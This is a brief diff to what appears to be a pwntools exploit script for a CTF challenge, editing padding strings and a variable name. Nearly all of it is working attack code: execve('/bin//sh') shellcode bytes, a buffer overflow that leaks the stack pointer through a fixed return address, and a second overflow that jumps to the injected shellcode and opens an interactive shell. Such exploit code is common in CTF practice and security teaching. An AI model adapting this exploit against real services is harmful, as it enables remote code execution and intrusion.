@@ -15,7 +15,7 @@ shellcode = '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x5
 #     'int 0x80',
 # ]))
 p.recvuntil('CTF:')
-p.send('a'*0x14 + p32(0x08048087))
-esp = u32(p.recv()[:4])
-p.send('a'*0x14 + p32(esp+20) + shellcode)
+p.send('A'*0x14 + p32(0x08048087))
+saved_esp = u32(p.recv()[:4])
+p.send('B'*0x14 + p32(saved_esp+20) + shellcode)
 p.interactive()
